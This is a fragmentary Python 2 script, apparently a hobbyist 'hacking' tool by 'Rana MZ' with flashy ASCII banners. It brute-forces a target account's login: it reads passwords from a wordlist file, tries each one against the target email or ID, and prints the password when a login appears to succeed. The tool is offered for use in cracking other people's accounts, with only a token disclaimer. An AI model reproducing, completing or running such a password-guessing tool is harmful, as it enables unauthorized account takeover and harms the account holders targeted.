...
def banner():
    ...
    print GG+"  √=============================================√"
    print WW+"  |            CODER + AUTHOR iZ: RANA MZ             |"
    print GL+"  |                     NAAM TU SUNA HUGA       |"
    print WW+"  |        NOTE : DONT TRY TO COPY iT BECZ IM THE ONE            |"
    print Y+"  |             NOTE: DONT USE ILLIGLE WAY          |"
    print GL+"  |---------------------------------------------|"
    print GL+"  |       NOTHiNG iZ iMPOSiBLE         |"
    print GL+"  |---------------------------------------------|"
    print GG+"  √=============================================√"
    print GL+"  |•••••••••   ENJOY MZ TOOL ^_^   •••••••••|"
    print GG+"  √=============================================√"
...
print " "
print "\033[92m╭────\033[91m[ \033[96mENTR  Wordlist FILE \033[95m( pass.txt ) \033[91;1m]"
...
def main():
        ...
        life()
        print " "
        print RR+" Wordlist doesn't match..."
        print " "
def mzz(mzz_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+mzz_password)
	sys.stdout.flush()
	...
	if mask != login and (not 'login_attempt' in mask):
			...
			print "          P A S S W O R D  F I N D "
	         	...
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(mzz_password)
        	        print " "
...
def life():
	...
	for mzz_password in password_nob:
		password_nob = mzz_password.replace("\n","")
		mzz(mzz_password)		
...
def runn_noobs():
 ...
 o    o      .oo   .oPYo.  o   o   .oPYo. ooo.   
 8    8     .P 8   8    8  8  .P   8.     8  `8. 
o8oooo8    .P  8   8      o8ob'    `boo   8   `8 
 8    8   oPooo8   8       8  `b   .P     8    8 
 8    8  .P    8   8    8  8   8   8      8   .P 
 8    8 .P     8   `YooP'  8   8   `YooP' 8ooo'  
:..:::....:::::..:::.....::..::..:::.....:.....::
:::::::::BY : Rana MZ:::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::: \033[91;1m

                \033[90;1mRana MZ\033[91;1m
             Powered by:\033[97m NAM TU SUNA HUGA
      """
